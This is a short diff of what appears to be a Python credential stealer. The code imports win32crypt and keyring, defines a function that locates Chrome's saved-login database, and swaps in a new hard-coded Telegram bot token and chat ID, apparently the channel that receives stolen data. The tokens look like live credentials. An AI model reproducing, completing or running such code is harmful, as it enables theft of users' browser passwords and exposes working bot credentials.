@@ -12,8 +12,8 @@ if platform.system() == "Windows":
     import win32crypt
     import keyring
 
-BOT_TOKEN = '7191024189:AAGZHq2c6kYiAArvwWgv0Xd4WPQko_1N2E8'
-CHAT_ID = '6324121131'
+BOT_TOKEN ='7948085435:AAFXoBX1bevtfdvL262PwmYRskQgzB8EoHM'
+CHAT_ID = '7764116385'
 
 def get_chrome_login_db():
     if platform.system() == "Windows":
